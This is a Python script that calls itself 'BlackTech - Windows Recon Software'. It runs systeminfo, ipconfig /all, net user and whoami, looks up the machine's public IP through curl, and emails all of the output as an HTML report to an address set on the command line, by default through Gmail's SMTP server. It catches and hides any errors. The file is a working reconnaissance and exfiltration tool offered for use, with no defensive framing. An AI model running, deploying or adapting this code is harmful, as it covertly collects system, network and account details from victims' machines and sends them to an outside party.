from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from argparse import ArgumentParser
import csv
import io
import subprocess
import tabulate
import smtplib

COMMANDS = (
    ("SYSTEM INFORMATION", "systeminfo", "TEXT"),
    ("NETWORK CONFIGURATION", "ipconfig /all", "TEXT"),
    ("USER INFORMATION", "net user", "TEXT"),
    ("LOGGED IN USERS", "net user %username%", "TEXT"),
)

def csvToHtml(csv_string: str):
    reader = csv.reader(io.StringIO(csv_string))
    headers = next(reader)
    rows = list(reader)

    html_code = tabulate.tabulate(rows, headers=headers, tablefmt="html")
    html_code = html_code.replace('<table>', '<table border="1">')
    return html_code

def sendMail(smtp_server: str, port: int, username: str, password: str,
             from_addr: str, to_addr: str, subject: str, body: str):
    try:
        msg = MIMEMultipart()
        msg["From"] = from_addr
        msg["To"] = to_addr
        msg["Subject"] = subject
        msg.attach(MIMEText(body, "html"))

        with smtplib.SMTP(smtp_server, port) as server:
            server.starttls()
            server.login(username, password)
            server.send_message(msg)

    except Exception as e:
        pass

def main(args):
    ip = subprocess.check_output("curl ifconfig.me/ip", text=True, shell=True).strip()
    username = subprocess.check_output("whoami", text=True, shell=True).strip()

    result = ""

    result += "<h2>[ CLIENT ]</h2>\n"
    result += f"IP: <b>{ip}</b><br>\n"
    result += f"User: <b>{username}</b><br>\n"
    result += "<hr>\n"

    for command in COMMANDS:
        title = str(command[0])
        cmd = str(command[1])
        output_type = str(command[2])

        commandresult = subprocess.check_output(cmd, text=True, shell=True)

        if output_type == "CSV":
            html_output = csvToHtml(commandresult)

            result += f"<h2>[ {title} ]</h2>\n"
            result += html_output
            result += "<br>\n"
        
        elif output_type == "TEXT":
            html_output = f"<pre>{commandresult}</pre>"

            result += f"<h2>[ {title} ]</h2>\n"
            result += html_output
            result += "<br>\n"

        result += "<hr>\n"

    sendMail(
        smtp_server=str(args.server),
        port=int(args.port),
        username=str(args.username),
        password=str(args.password),
        from_addr=str(args.username),
        to_addr=str(args.to),
        subject=f"[REPORT - IP: {ip} | USER: {username}]",
        body=result
    )

if __name__ == "__main__":
    parser = ArgumentParser(description="BlackTech - Windows Recon Software")
    parser.add_argument("-s", "--server", help="SMTP server address", type=str, default="smtp.gmail.com")
    parser.add_argument("-p", "--port", help="SMTP server port", type=int, default=587)
    parser.add_argument("-u", "--username", help="SMTP username", type=str ,required=True)
    parser.add_argument("-pw", "--password", help="SMTP password", type=str, required=True)
    parser.add_argument("-t", "--to", help="Recipient email address", type=str, required=True)

    args = parser.parse_args()

    main(args)